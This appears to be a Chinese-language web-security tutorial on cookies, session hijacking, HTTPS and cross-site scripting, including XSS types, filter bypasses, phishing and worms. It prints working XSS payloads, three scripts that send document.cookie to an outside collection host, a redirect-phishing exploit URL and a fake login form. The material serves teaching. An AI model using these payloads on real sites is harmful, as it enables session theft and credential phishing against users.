<p>HttpOnly开启会限制访问cookie，但是如果服务器响应页面有cookie调试信息，还是会导致cookie泄露</p>
<p><img src="https://pic.imgdb.cn/item/67584652d0e0a243d4e17f13.png"></p>
<p>CVE漏洞：</p>
<p><img src="https://pic.imgdb.cn/item/6758467ad0e0a243d4e17f25.png"></p>
<ol start="5">
<li>Secure Cookie机制</li>
</ol>
<p>​		Secure Cookie机制指的是设置了Secure标志的Cookie仅在HTTPS层面上安全传输，如果请求是HTTP的就不会带上这个Cookie，这样能降低重要的Cookie被中间人截获的风险。但是，Secure Cookie对于客户端脚本来说是可读写的，也就意味着，它能够被盗取和篡改。可通过如下的JS代码可对已知的Secure Cookie进行篡改:</p>
<p><img src="https://pic.imgdb.cn/item/6758474dd0e0a243d4e17f5a.png"></p>
<h5 id="Cookie存储"><a href="#Cookie存储" class="headerlink" title="Cookie存储"></a>Cookie存储</h5><ol>
<li>本地Cookie与内存Cookie</li>
</ol>
<p>​		存储方式与过期时间(expires)相关。<br>​		如果没设置过期时间，则是内存Cookie，这样的Cookie会随着浏览器关闭而从内存中消失;如果设置了过期时间，那么就是本地Cookie，这样的Cookie就会以文本形式保存在操作系统本地，待过期时间到了才会消失。<br>​		document.cookie=”expires=1;expires=Mon, 01 Jan 2021 00:00:00 GMT”//GMT时间，2021年1月1日才会过期</p>
<ol start="2">
<li>本地Cookie与存储Cookie那种方式更安全?</li>
</ol>
<p>​		采用本地Cookie可以让用户在未来某一段时间内都不需要进行登录操作，但是，如果攻击者通过XSS得到这样的本地Cookie后，就能够在未来很长一段时间内，甚至永久控制着目标用户的账号权限。但这并不意味着内存Cookie更安全，因为攻击者可以给内存Cookie加一个过期时间，使其变为本地Cookie。</p>
<ol start="3">
<li>本地存储方式</li>
</ol>
<p>​		浏览器本地存储是一种在浏览器中长久保存数据的方法，为本地数据持久化，当我们刷新页面或者同域名内页面跳转仍然可以保留数据。浏览器本地存储，对服务器来说减小存储压力;对用户来说，相应速度变快，提升用户体验。</p>
<p><img src="https://pic.imgdb.cn/item/6758488dd0e0a243d4e17fa4.png"></p>
<h4 id="4-4-4-HTTP协议安全"><a href="#4-4-4-HTTP协议安全" class="headerlink" title="4.4.4 HTTP协议安全"></a>4.4.4 HTTP协议安全</h4><h5 id="Weak-Session-lDs-弱会话IDs"><a href="#Weak-Session-lDs-弱会话IDs" class="headerlink" title="Weak Session lDs(弱会话IDs)"></a>Weak Session lDs(弱会话IDs)</h5><p>​		当用户登录后，在服务器就会创建一个会话(Session)，叫做会话控制，再访问页面的时候就不用登录，只需要携带Session去访问。<br>​		SessionID作为特定用户访问站点所需要的唯一内容。如果能够计算或轻易猜到该SessionlD，则攻击者将可以轻易获取访问权限，无需登录直接进入特定用户界面，进而执行其他操作。<br>​		用户访问服务器的时候，在服务器端会创建一个新的会话(Session)，会话中会保存用户的状态和相关信息，用于标识用户。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。用户拿到<br>SessionlD就会加密后保存到 cookies 上，之后只要cookies随着http请求发送服务器，服务器就知道你是谁了。SessionlD一旦在生命周期内被窃取，就等同于账户失窃。</p>
<p>​		Session利用的实质：由于SessionID是用户登录之后持有的唯一认证凭证，因此黑客不需要再攻击登陆过程(比如密码)，就可以轻易获取访问权限，无需登录密码直接进入特定用户界面，进而查找其他漏洞如XSS、文件上传等等。<br>​		Session劫持：就是一种通过窃取用户SessionlD，使用该SessionID登录进目标账户的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。如果SessionlD是保存在Cookie中的，则这种攻击可以称为Cookie劫持。SessionID还可以保存在URL中，作为一个请求的一个参数，但是这种方式的安全性难以经受考验。</p>
<p><img src="https://pic.imgdb.cn/item/67584c30d0e0a243d4e180a9.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584c78d0e0a243d4e180d8.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584c99d0e0a243d4e180e1.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584cc5d0e0a243d4e180f6.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584cd7d0e0a243d4e1810a.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584d06d0e0a243d4e18110.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584d14d0e0a243d4e18112.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584d49d0e0a243d4e1815a.png"></p>
<h5 id="HTTP协议存在的安全问题"><a href="#HTTP协议存在的安全问题" class="headerlink" title="HTTP协议存在的安全问题"></a>HTTP协议存在的安全问题</h5><p><img src="https://pic.imgdb.cn/item/67584d5dd0e0a243d4e18165.png"></p>
<h5 id="HTTPS协议"><a href="#HTTPS协议" class="headerlink" title="HTTPS协议"></a>HTTPS协议</h5><p><img src="https://pic.imgdb.cn/item/67584d8cd0e0a243d4e1818e.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584dd0d0e0a243d4e181cb.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584dfad0e0a243d4e181e4.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584e1fd0e0a243d4e181f1.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584e43d0e0a243d4e181f9.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584e70d0e0a243d4e1820d.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584e8fd0e0a243d4e18212.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584edbd0e0a243d4e18222.png"></p>
<p><img src="https://pic.imgdb.cn/item/67584f3ad0e0a243d4e18232.png"></p>
<h4 id="4-4-5-XSS跨站脚本攻击–XSS漏洞概述"><a href="#4-4-5-XSS跨站脚本攻击–XSS漏洞概述" class="headerlink" title="4.4.5 XSS跨站脚本攻击–XSS漏洞概述"></a>4.4.5 XSS跨站脚本攻击–XSS漏洞概述</h4><h5 id="XSS漏洞概述"><a href="#XSS漏洞概述" class="headerlink" title="XSS漏洞概述"></a>XSS漏洞概述</h5><ol>
<li>XSS介绍</li>
</ol>
<p>​		XSS被称为跨站脚本攻击(Cross-sitescripting)，由于和CSS(Cascading Style Sheets)重名，所以改为XSS。<br>​		XSS主要基于javascript语言完成恶意的攻击行为，因为javascript可以非常灵活的操作html、css和浏览器。</p>
<p>​		XSS就是指通过利用网页开发时留下的漏洞(由于Web应用程序对用户的输入过滤不足)，巧妙的将恶意代码注入到网页中，使用户浏览器加载并执行攻击者制造的恶意代码，以达到攻击的效果。这些恶意代码通常是JavaScript，但实际上也可以包括Java、VBScript、ActiveX、Flash 或者普通的HTML。</p>
<p>​		当用户访问被XSS注入的网页，XSS代码就会被提取出来。用户浏览器就会解析这段XSS代码，也就是说用户被攻击了。<br>​		用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript 解释器，可以解析javascript，然而由于浏览器并不具有人格，不会判断代码是否恶意，只要代码符合语法规则，浏览器就会解析这段XSS代码。</p>
<p>​		简单来说，XSS就是通过攻击者精心构造的JS代码注入到网页中，并由浏览器解释运行这段JS代码，以达到恶意攻击浏览器的效果。XSS攻击的对象是用户浏览器，属于被动攻击。因此XSS攻击涉及到三个角色:</p>
<ul>
<li>攻击者</li>
<li>用户浏览器</li>
<li>服务器</li>
</ul>
<p>​		从上述可知，XSS属于客户端攻击，受害者最终是用户，不要以为受害者是用户就认为跟自己的网站、服务器安全就没有关系。不要忘记，网站的管理员也是用户之一!因为管理员要比普通用户权限大的多，可以利用当其跳板实施攻击。</p>
<p>实施XSS攻击需要具备的两个条件：</p>
<ul>
<li>需要向Web页面注入精心构造的恶意代码</li>
<li>对用户的输入没有做过滤，恶意代码能够被浏览器成功的执行</li>
</ul>
<ol start="2">
<li>XSS验证</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67585465d0e0a243d4e1833d.png">	</p>
<p>XSS验证语句：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;		常用</span><br><span class="line">&lt;script&gt;confirm('xss')&lt;/script&gt;</span><br><span class="line">&lt;script&gt;prompt("xss")&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>​		在测试页面中提交上述的代码，浏览器执行后就能看到弹框的操作，弹窗的目的是验证JS代码是否被执行。我们发现，提交的代码&lt;script&gt;alert(‘xss”)&lt;/script&gt;，被当做字符串输出在HTML页面中，浏览器会根据&lt;script&gt;标签识别为JS代码，并会执行它，执行弹窗操作。也就是我们可以执行JS代码，验证了XSS漏洞的存在性。</p>
<ol start="3">
<li>XSS危害</li>
</ol>
<ul>
<li>盗取各种用户账号</li>
<li>窃取用户Cookie资料，冒充用户身份进入网站</li>
<li>劫持用户会话，执行任意操作</li>
<li>刷流量，执行弹窗广告</li>
<li>传播蠕虫病毒</li>
<li>攻击者能在一定限度内记录用户的键盘输入</li>
</ul>
<h4 id="4-4-6-XSS跨站脚本攻击–XSS漏洞分类"><a href="#4-4-6-XSS跨站脚本攻击–XSS漏洞分类" class="headerlink" title="4.4.6 XSS跨站脚本攻击–XSS漏洞分类"></a>4.4.6 XSS跨站脚本攻击–XSS漏洞分类</h4><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><p>​		反射型XSS又称为非持久型XSS，是现在最容易出现的一种XSS漏洞。用户在请求某条URL地址的时候，会携带一部分数据。当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器，从而触发反射型XSS。</p>
<p>​		比如，当用户进行搜索时，返回结果通常会包括用户原始的搜索内容，如果攻击者精心构造包含XSS恶意代码的链接，诱导用户点击并成功执行后，用户的信息就可以被窃取，甚至可以模拟用户进行一些操作。</p>
<p>编码伪装：</p>
<p><img src="https://pic.imgdb.cn/item/6758dae9d0e0a243d4e18bac.png"></p>
<p>短链接伪装：</p>
<p><img src="https://pic.imgdb.cn/item/6758db0ed0e0a243d4e18bae.png"></p>
<ul>
<li>特点<ul>
<li>非持久性</li>
<li>参数型脚本</li>
<li>反射型XSS的JS代码在Web应用的参数(变量)中，如搜索框等地方</li>
</ul>
</li>
<li>数据流量走向:浏览器-&gt;后端 -&gt;浏览器</li>
</ul>
<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>​		存储型XSS又叫持久型XSS。一般而言，它是三种XSS里危害最大的一种。此类型的XSS漏洞是由于恶意攻击代码被持久化保存到服务器上，然后被显示到HTML页面之中。这类漏洞经常出现在用户评论的页面，攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代码，从而窃取用户的敏感信息。</p>
<ul>
<li><p>特点</p>
<ul>
<li>持久性跨站脚本</li>
<li>持久性体现在JS代码不是在某个参数(变量)中，而是写进数据库或文件等可以永久保存数据的介质中，如留言板等地方</li>
</ul>
</li>
<li><p>数据流量走向：浏览器 -&gt;后端 -&gt;数据库 -&gt;后端 -&gt; 浏览器</p>
</li>
</ul>
<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p><img src="https://pic.imgdb.cn/item/6758dd86d0e0a243d4e18bda.png"></p>
<p>文档是由节点构成的集合，在DOM里存在许多不同类型的节点，主要分为以下三种</p>
<ul>
<li>元素节点<ul>
<li>在“购物清单”例子中，&lt;body&gt;、&lt;p&gt;、&lt;u&gt;之类的元素在文档中的布局形成了文档的结构，它们即是元素节点。</li>
</ul>
</li>
<li>文本节点<ul>
<li>文档通常会包含一些内容，这些内容多数由文本提供，如前面例子中，&lt;p&gt;包含着文本“欢迎购买”，它就是一个文本节点。</li>
</ul>
</li>
<li>属性节点<ul>
<li>元素或多或少都有一些属性，属性用于对元素做出更具体的描述。</li>
</ul>
</li>
</ul>
<p>​		DOM型XSS漏洞是基于<strong>文档对象模型</strong>(Document Object Model)的一种漏洞这种XSS与反射型XSS、持久型XSS在原理上有本质区别，它的攻击代码并不需要服务器解析响应，<u><strong>触发XSS靠的是浏览器端的DOM解析</strong></u>。客户端上的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。在客户端直接输出DOM内容的时候极易触发DOM型XSS漏洞，如document.getElementByld(“x”).innerHTML、document.write等,</p>
<p><img src="https://pic.imgdb.cn/item/6758dfaad0e0a243d4e18bf8.png"></p>
<p><img src="https://pic.imgdb.cn/item/6758e029d0e0a243d4e18c0b.png"></p>
<p><img src="https://pic.imgdb.cn/item/6758e107d0e0a243d4e18c29.png"></p>
<p><img src="https://pic.imgdb.cn/item/6758e129d0e0a243d4e18c2c.png"></p>
<ul>
<li>特点<ul>
<li>非持久性</li>
</ul>
</li>
<li>数据流量走向：URL-&gt;浏览器</li>
</ul>
<h4 id="4-4-7-XSS跨站脚本攻击–Payload构造及变形"><a href="#4-4-7-XSS跨站脚本攻击–Payload构造及变形" class="headerlink" title="4.4.7 XSS跨站脚本攻击–Payload构造及变形"></a>4.4.7 XSS跨站脚本攻击–Payload构造及变形</h4><ol>
<li>利用【&lt;&gt;】构造HTML标签和&lt;script&gt;&lt;/script&gt;标签</li>
</ol>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 style="color:green;"&gt;XSS&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>

<ol start="2">
<li>利用HTML标签的属性值(伪协议)</li>
</ol>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href="javascript:alert(/xss/)"&gt;touch me !&lt;/a&gt;</span><br><span class="line">&lt;img src="javascript:alert('xss")"&gt;(此标签需要在IE6下测试)</span><br></pre></td></tr></tbody></table></figure>

<ol start="3">
<li>利用事件</li>
</ol>
<p>事件种类</p>
<ul>
<li>windows事件		对windows 对象触发的事件</li>
<li>Form 事件	          HTML 表单内的动作触发事件</li>
<li>Keyboard 事件	  键盘按键</li>
<li>Mouse 事件		   由鼠标或类似用户动作触发的事件</li>
<li>Media 事件		    由多媒体触发的事件</li>
</ul>
<p>参考链接:<br><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>
<p><img src="https://pic.imgdb.cn/item/6758e391d0e0a243d4e18c68.png"></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src= './smile.jpg' onmouseover='alert(/xss/)'&gt;</span><br><span class="line">&lt;img src=x onerror=alert(/xss/)&gt;</span><br><span class="line">&lt;input type="text" onclick="alert(/xss/)"&gt;</span><br></pre></td></tr></tbody></table></figure>

<ol start="4">
<li>利用CSS</li>
</ol>
<p>可以利用CSS(层叠样式脚本)触发XSS。但是这种方法比较古老，基本上不适合现在主要的浏览器，但是从学习的角度，我们需要了解这种类型的XSS，以下代码均在IE6下测试:</p>
 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">行内样式</span><br><span class="line">&lt;div style="background-image:url(javascript:alert(/xss/))"&gt;</span><br><span class="line">页内样式</span><br><span class="line">&lt;style&gt;Body{background-image:url(javascript:alert(/xss/))}&lt;/style&gt;</span><br><span class="line">外部样式</span><br><span class="line">&lt;link rel="stylesheet" type="text/css" href="./xss.css"&gt;</span><br><span class="line">expression</span><br><span class="line">&lt;div style="width:expression(alert(/xss/))"&gt;</span><br></pre></td></tr></tbody></table></figure>

<ol start="5">
<li>大小写绕过</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6758e4b7d0e0a243d4e18c8d.png"></p>
<ol start="6">
<li>双写绕过</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6758e4f0d0e0a243d4e18c94.png"></p>
<ol start="7">
<li>引号，反引号有时可以代替单双引号和括号</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6758e5a1d0e0a243d4e18ca2.png"></p>
<ol start="8">
<li>【/】代替空格</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6758e616d0e0a243d4e18cb6.png"></p>
<ol start="9">
<li>Tab与回车</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6758e64ed0e0a243d4e18cbc.png"></p>
<ol start="10">
<li>编码</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6758e693d0e0a243d4e18ce1.png"></p>
<p><img src="https://pic.imgdb.cn/item/6758e6eed0e0a243d4e18cf8.png"></p>
<h4 id="4-4-8-Cookie攻击"><a href="#4-4-8-Cookie攻击" class="headerlink" title="4.4.8 Cookie攻击"></a>4.4.8 Cookie攻击</h4><h5 id="Cookie基础"><a href="#Cookie基础" class="headerlink" title="Cookie基础"></a>Cookie基础</h5><ol>
<li>简介</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6758e885d0e0a243d4e18d28.png"></p>
<ol start="2">
<li>Cookie特性</li>
</ol>
<ul>
<li>同一个网站中所有的页面共享一套Cookie(因为不可能在同一个网站，打开页面都要登录一次，以域名为单位)</li>
<li>数量、大小限制(过大的存储是不现实的)</li>
<li>过期时间(如果不设置过期时间，关闭浏览器就会自动清除Cookie)</li>
</ul>
<ol start="3">
<li>Cookie作用</li>
</ol>
<ul>
<li>Cookie最大作用维持会话的凭证</li>
<li>减少登录网站的次数</li>
<li>记录关于用户信息</li>
</ul>
<ol start="4">
<li>Cookie类型</li>
</ol>
<p>根据Cookie的时效性以及相关特点，可以把它分为两种类型：<strong>持久型Cookie</strong>和<strong>临时型Cookie</strong>。</p>
<ul>
<li>持久型Cookie以文本形式存储在硬盘上，由浏览器存取</li>
<li>临时型Cookie也称为会话Cookie，存储在内存中，关闭当前浏览器后会立即消失</li>
</ul>
<ol start="5">
<li>Cookie属性</li>
</ol>
<ul>
<li>Name–Cookie的名称;</li>
<li>Value–读写Cookie的值;</li>
<li>Expires–通过给定一个过期时间来创建一个持久化Cookie:</li>
<li>Path–关联到Cookie的路径，默认为/</li>
<li>Domain–设置关联Cookie的域名;</li>
<li>Secure–用于指定Cookie需要通过安全Socket层连接传递</li>
<li>HttpOnly–用于避免Cookie被JavaScript访问</li>
</ul>
<ol start="6">
<li>Cookie操作</li>
</ol>
<p>浏览器通过Document对象访问Cookie。<br>若要创建一个Cookie，只要将特定格式的字符串赋给document.cookie即可<br>        cookieName=cookieValue;expirationdate;path<br>后端语言处理方式:<br>        PHP setrawcookie()<br>                setcookie()</p>
<p><img src="https://pic.imgdb.cn/item/6758ead2d0e0a243d4e18d7d.png"></p>
<p><img src="https://pic.imgdb.cn/item/6758eb11d0e0a243d4e18d86.png"></p>
<h5 id="Cookie攻击"><a href="#Cookie攻击" class="headerlink" title="Cookie攻击"></a>Cookie攻击</h5><ol>
<li>常见的Cookie攻击方式</li>
</ol>
<p>​		实现基于HTTP Cookie攻击的前提是目标系统在Cookie中保存了用户ID、凭证状态等其它可以用来进行攻击的信息。<br>常见的基于Cookie的攻击方式有三种：<br>​		1、直接访问Cookie文件查找想要的机密信息<br>​		2、在客户端和服务端进行Cookie信息传递的时候进行窃取，从而冒充合法用户操作;<br>​		3、攻击者修改Cookie信息，所以在服务端接收到客户端获取的Cookie信息的时候就会对攻击者伪造过的Cookie信息操作。</p>
<ol start="2">
<li>获取Cookie信息的主要途径</li>
</ol>
<ul>
<li>直接读取磁盘的Cookie文件;</li>
<li>使用网络嗅探器来获取网络上传输的Cookie;</li>
<li>使用Cookie管理工具获取内存或文件系统中的Cookie</li>
<li>使用跨站脚本盗取Cookie</li>
</ul>
<ol start="3">
<li>获取客户端cookie信息</li>
</ol>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、&lt;script&gt; document.location="http://www.test.com/cookie.asp?cookie="+document.cookie &lt;/script&gt;</span><br><span class="line">2、&lt;script&gt; new lmage().src="http://www.test.com/cookie.asp?cookie="+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">3、&lt;script&gt; document.write('&lt;img src="http://www.test.com/cookie.asp?cookie='+document.cookie+'" width=0 height=0 border=0 /&gt;');&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://pic.imgdb.cn/item/6758eddad0e0a243d4e18e3a.png"></p>
<ol start="4">
<li>相关函数介绍</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/6758ee4fd0e0a243d4e18e56.png"></p>
<p><img src="https://pic.imgdb.cn/item/6758ee62d0e0a243d4e18e58.png"></p>
<p><img src="https://pic.imgdb.cn/item/6758ee7cd0e0a243d4e18e60.png"></p>
<h5 id="XSS钓鱼攻击"><a href="#XSS钓鱼攻击" class="headerlink" title="XSS钓鱼攻击"></a>XSS钓鱼攻击</h5><p>​		网络钓鱼(Phishing)是一种利用欺骗性的电子邮件和伪造的Web站点进行网络诈骗，意图引诱受害者给出敏感信息(如用户名、口令、身份证号等信息)的攻击手段，主要通过对受害者心理弱点、好奇心、信任度等心理陷阱来实现诈骗。属于社会工程学的一种。<br>假设有一个网页文件含有以下HTML代码<br>​		&lt;a href=”<a target="_blank" rel="noopener" href="http://www.qq.com">百度\"&gt;http://www.qq.com"&gt;百度\</a></p>
<ol>
<li>XSS重定向钓鱼(XSS Redirect Phishing)</li>
</ol>
<p>将正常用户访问重定向到恶意网站，将恶意网站伪造的和正常访问的网站一样。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">假设www.bug.com上有一处XSS</span><br><span class="line">http://www.bug.com/index.php?search=【Expliot】</span><br><span class="line">Exploit:</span><br><span class="line">http://www.bug.com/index.php?search="'&gt;&lt;script&gt;document.location.href ="http://www.baidu.com"&lt;/script&gt;</span><br><span class="line">这样便会让用户从当前访问的网站跳转到一个钓鱼网站。</span><br></pre></td></tr></tbody></table></figure>

<ol start="2">
<li>HTML注入式钓鱼(XSS HTMLInject Phishing)</li>
</ol>
<p>HTML注入式钓鱼是指直接利用XSS漏洞注入HTML或JavaScript代码到页面中</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-align:center;"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">form</span> <span class="attr">Method</span>=<span class="string">"PosT"</span> <span class="attr">Action</span>=<span class="string">"phishing.php"</span> <span class="attr">Name</span>=<span class="string">"form"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Login:<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"login"</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">br</span> /&gt;</span>Password:<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"Password"</span> <span class="attr">type</span>=<span class="string">"password"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"Valid"</span> <span class="attr">value</span>=<span class="string">"Ok"</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<pre><code>    &lt;div style="text-align:center;"&gt;
        &lt;form Method="PosT" Action="phishing.php" Name="form"&gt;&lt;br /&gt;
            &lt;br /&gt;Login:&lt;br/&gt;
            &lt;input name="login"/&gt;
            &lt;br /&gt;Password:&lt;br/&gt;
            &lt;input name="Password" type="password" /&gt;&lt;br/&gt;&lt;br/&gt;
            &lt;input name="Valid" value="Ok" type="submit" /&gt;&lt;br/&gt;
        &lt;/form&gt;
    &lt;/div&gt;
</code></pre>
<p>​	<img src="https://pic.imgdb.cn/item/6758f0b4d0e0a243d4e18ee9.png"></p>
<ol start="3">
<li>iframe钓鱼</li>
</ol>
<p>iframe钓鱼是通过标签嵌入远程域的一个页面实施钓鱼。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src="http://www.baidu.com" height="100%" width="100%"&lt;/iframe&gt;</span><br></pre></td></tr></tbody></table></figure>

<iframe src="http://www.baidu.com" height="100%" width="100%" <="" iframe="">

<ol start="4">
<li>高级钓鱼技术</li>
</ol>
<p>注入代码劫持HTML表单、使用JavaScript编写键盘记录器等</p>
<h4 id="4-4-9-XSS-Worm"><a href="#4-4-9-XSS-Worm" class="headerlink" title="4.4.9 XSS Worm"></a>4.4.9 XSS Worm</h4><h5 id="XSS-Worm介绍"><a href="#XSS-Worm介绍" class="headerlink" title="XSS Worm介绍"></a>XSS Worm介绍</h5><ol>
<li>蠕虫案例剖析</li>
</ol>
<p>​		2005年10月4日，世界上第一只“Web 2.0蠕虫”诞生了。当时有人在国外著名社交网络MySpace上写了一段JavaScript 蠕虫代码，利用 Ajax 方法让无数的用户在毫不知情的情况下把作者加入了好友名单，同时在他们的个人简介里自动加上了“samy is my hero”的字样。此 Samy XSS Worm在MySpace上疯狂散播，一天内就感染了超过100万用户。由于极其惊人的传播速度，最终导致MySpace服务器崩溃</p>
<ol start="2">
<li>XSS Worm 定义</li>
</ol>
<p>​		所谓的跨站脚本蠕虫(XSS Worm)，实质上是一段脚本程序，通常用JavaScript或Vbscript写成，在用户浏览XSS页面时被激活。蠕虫利用站点页面的XSS漏洞根据其特定规则进行传播和感染。<br>​		值得注意的是，XSS蠕虫只是Web 2.0蠕虫的其中一种，也是最广为人知的一种，它利用网站的XSS漏洞进行散播。Web 2.0蠕虫还有其他形式，如CSRFWorm，顾名思义，该类蠕虫是利用网站的CSRF漏洞进行攻击。</p>
<ol start="3">
<li>蠕虫攻击流程</li>
</ol>
<p>（1）攻击者发现目标网站存在XSS漏洞，并且可以编写XSS蠕虫。<br>（2）利用一个宿主(如博客空间)作为传播源头进行XSS攻击。<br>（3）当其他用户访问被感染的空间时，XSS蠕虫执行以下操作。</p>
<p>​		判断用户是否登录，如果已登录就执行下一步；如果没登录则执行其他操作。<br>​		继续判断该用户是否被感染，如果没有就将其感染；如果已感染则跳过。</p>
<p><img src="https://pic.imgdb.cn/item/6758f395d0e0a243d4e18fc8.png"></p>
<h5 id="XSS-Worm剖析"><a href="#XSS-Worm剖析" class="headerlink" title="XSS Worm剖析"></a>XSS Worm剖析</h5><p>编写一只完整的XSS蠕虫并不困难，一般需要具有Web开发经验，此外还要对目标程序网站的应用层逻辑和XSS Worm的业务流程有所了解。<br>（1）寻找XSS点<br>（2）实现蠕虫行为<br>（3）收集蠕虫数据<br>（4）传播与感染</p>
<ol>
<li>运用DOM技术</li>
</ol>
<p>​		构建一只完整的XSS Worm，不可避免地要使用许多DOM节点技术。<br>​		如访问页面元素的DOM HTML表单，可以使用不同的技术，常见的方法是给出一个特定的标识符(ID)，然后使用document的getElementByld()函数来访问：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">……</span><br><span class="line">var div1=document.getElementByld( “div1”);</span><br><span class="line">遍历DOM是一种平滑的体验，另外还有两种强大的方法:</span><br><span class="line">document.getElementByname //获得指定name的&lt;html&gt;标签相关信息</span><br><span class="line">document.getElementByTagName //获得指定的&lt;html&gt;标签相关信息</span><br></pre></td></tr></table></figure>

